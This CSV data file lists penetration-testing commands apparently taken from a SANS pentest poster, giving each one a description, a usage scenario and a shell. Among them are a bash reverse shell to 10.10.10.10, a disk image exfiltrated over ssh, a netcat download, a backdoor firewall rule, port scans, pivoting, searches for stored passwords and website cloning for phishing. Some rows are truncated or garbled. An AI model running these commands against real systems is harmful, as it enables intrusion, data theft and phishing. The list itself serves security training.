Description,Usage,Command,Language,Source
Configure a Windows machine as a WPA2-PSK Access Point.,"Usage scenario: Share a Windows machine?s Internet access with other systems wirelessly, or use a Windows machine to attract wireless clients into joining it for exploitation purposes.","netsh wlan set hostednetwork mode=allow ssid=<MYSSID>
key=<MYPASSWORD> && netsh wlan start hostednetwork",CMD.exe,SANS-PenTest-Commands-Poster.pdf
"Configure a TCP port forwarding relay from IPv4 to IPv6 (v4tov4, v6tov6,
and v6tov4 also supported).","Usage scenario: Pivot a TCP connection through a Windows machine using
built-in functionality, converting IPv4 to IPv6 as needed.","netsh interface portproxy add v4tov6 listenport=<LPORT>
listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>",CMD.exe,SANS-PenTest-Commands-Poster.pdf
Get a list of TCP and UDP activity every 1 second.,"Usage scenario: Look for a connection coming in from a specific IP
address or port to determine when the connection occurs, within 1 second.","netstat -naob 1 | find ""<IPADDR or PORT>""",CMD.exe,SANS-PenTest-Commands-Poster.pdf
Get a list of all available attributes of all running processes.,"Usage scenario: Look through processes to determine what is running,
including potentially exploitable software, malware, and other tools.",wmic process list full,CMD.exe,SANS-PenTest-Commands-Poster.pdf
Get a list of services running inside of each process.,"Usage scenario: Look for running services that might be exploitable or
running malware.",tasklist /svc,CMD.exe,SANS-PenTest-Commands-Poster.pdf
Add a firewall rule to the built-in Windows firewall.,"Usage scenario: Allow connections into a new port for a
listening backdoor, a service ready to deliver an exploit
to clients, or a pivot.","New-NetFirewallRule -Action Allow
-DisplayName Pentester-C2 -RemoteAddress
<IPADDR>",Powershell,SANS-PenTest-Commands-Poster.pdf
"Conduct a port scan of a target IP address, using only built-in
features.","Usage scenario: Discover open ports on other target machines,
using only built-in features.","1..1024 | % {echo ((new-object
Net.Sockets.TcpClient).Connect(""<IPADDR>"",
$_)) ""Port $_ is open!""} 2>$null ",Powershell,SANS-PenTest-Commands-Poster.pdf
"Conduct a ping sweep of a target IP address
space, using only built-in features.","Usage scenario: In post-exploitation,
find additional target machines.","10.$_""; ping -n 1 -w 100
10.10.10.$_ | Select-String ttl}",Powershell,SANS-PenTest-Commands-Poster.pdf
On-Line Web Client Win 7,Usage: Moving files. Instantiate a web client to download a file (such as nc.exe) from a given URL.,"(New-Object
System.Net.WebClient).DownloadFile(""http://
10.10.10.10/nc.exe"",""c:\nc.exe"")",Powershell,SANS-PenTest-Commands-Poster.pdf
On-Line Web Client Win 8 and later,Usage: Moving files. Instantiate a web client to download a file (such as nc.exe) from a given URL.," wget
""http://10.10.10.10/nc.exe"" -outfile
""c:\nc.exe"" ",Powershell,SANS-PenTest-Commands-Poster.pdf
"Encode or decode base64
information.","Usage scenario: Quickly determine
the un-encoded value of base64
strings in web applications,
configuration files, protocol
messages, and more.","echo 'Hello, World!' |
base64 or echo
'SGVsbG8sIFdvcmxkIQo=' |
base64 -d",Powershell,SANS-PenTest-Commands-Poster.pdf
Shows help and examples,,Get-Help [cmdlet] -example,Powershell,SANS-PenTest-Commands-Poster.pdf
Shows a list of commands,,Get-Command,Powershell,SANS-PenTest-Commands-Poster.pdf
Shows properties and methods,,Get-Member,Powershell,SANS-PenTest-Commands-Poster.pdf
Takes each item on pipeline and handles it as $_,,ForEach-Object { $_ },Powershell,SANS-PenTest-Commands-Poster.pdf
"Searches for strings in files or output, like grep",,Select-String,Powershell,SANS-PenTest-Commands-Poster.pdf
"Search c:\PATH\TO\DIRECTORY for files that contain the
“STRING”, displaying the file name and the line containing the
STRING.","Usage scenario: Find password files, database connection strin
encryption keys, and a multitude of other useful items during
gs,
post-exploitation.","ls -r c:\PATH\TO\DIRECTORY -file | %
{Select-String -path $_ -pattern STRING}",Powershell,SANS-PenTest-Commands-Poster.pdf
Clone a website to the local system.,"Usage scenario: Create a look-alike website to use for impersonation attacks, such as a site to direct victims to during spear phishing attacks.", wget -r -nH $URL or wget -mkEpnp $URL,BASH,SANS-PenTest-Commands-Poster.pdf
"Redirect IPv6 listening TCP port to
localhost IPv4.","Usage scenario: Pivoting a connection
across the network via IPv6 to a local
listening port on IPv4, allowing
IPv4-focused TCP tools to attack
across IPv6.","IPV6ADDR=fc00:660:0:1::46
&& PORT=110 && socat
TCP-LISTEN:$PORT,reuseaddr,
fork TCP6:[$IPV6ADDR]:$PORT",BASH,SANS-PenTest-Commands-Poster.pdf
Get the external IP address of the machine the command is run on.,"Usage scenario: After exploiting a machine, especially via client-side exploit, determine the external IP address of that machine to better understand where the machine is and how it is accessing the outside world.","dig +short
myip.opendns.com
@resolver1.opendns.com",BASH,SANS-PenTest-Commands-Poster.pdf
Get the external IP address of the machine the command is run on.,"Usage scenario: After exploiting a machine, especially via client-side exploit, determine the external IP address of that machine to better understand where the machine is and how it is accessing the outside world.", wget -qO- ifconfig.me/ip,BASH,SANS-PenTest-Commands-Poster.pdf
"Exfiltrate the contents of an
image via SSH to another
machine, compressing (-C) the
content to speed up transfer.","Usage scenario: Upon exploiting a
machine with a small file
system or particularly
interesting partition, move that
partition to the pen tester’s
machine, compressing and
encrypting data using SSH.","dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 ""cat >/tmp/image.dd""",BASH,SANS-PenTest-Commands-Poster.pdf
"Type “gah” after you forgot to use
sudo, and it’ll sudo your most recent
command.","Usage scenario: Day-to-day bash
tricks to make life easier.","alias gah='sudo $(history
-p \!\!)'",BASH,SANS-PenTest-Commands-Poster.pdf
"Search /PATH/TO/DIRECTORY for
files of the type “FILE-FILTER”
(e.g., *.txt) that contain the
“STRING”, displaying the line of the
file with “STRING” and the file
name.","Usage scenario: Find password files,
database connection strings,
encryption keys, and a multitude of
other useful items during
post-exploitation.","find /PATH/TO/DIRECTORY
-name ""FILE-FILTER"" -type
f -exec grep -i ""STRING""
{} \; -print 2>/dev/null",BASH,SANS-PenTest-Commands-Poster.pdf
Cat a file using colorful output.,"Usage scenario: Review XML, code,
or configuration files in a manner
that is easier to read and makes
the world a more beautiful place.","alias ccat='pygmentize
-O bg=dark,style=colorful'",BASH,SANS-PenTest-Commands-Poster.pdf
"Measure whether a service is still up
by connecting to its port every 1
second.","Usage scenario: verify service is still
running during exploitation."," while (true); do nc -vv
-z -w3 10.10.10.10 80 >
/dev/null && echo -e
""Service is up""; sleep 1;
done",BASH,SANS-PenTest-Commands-Poster.pdf
"Create a reverse shell back to a
given IP address and port.","Usage scenario: Exploit a target
machine (e.g., through command
injection) and get a shell using only
built-in features of bash."," bash -i >&
/dev/tcp/10.10.10.10/8080
0>&1",BASH,SANS-PenTest-Commands-Poster.pdf
List the firewall rules and display them in grid view or CSV.,Usage scenario: Review the Windows built-in firewall rules to look for open ports to use for attacks and pivots.,"Get-NetFirewallRule -all | Out-GridView or Get-NetFirewallRule | Export-CSV <file_path.csv>
Get-NetFirewallRule -all | Export-csv <file_path.csv>",BASH,SANS-PenTest-Commands-Poster.pdf
http://icanhazip.com/,,,,
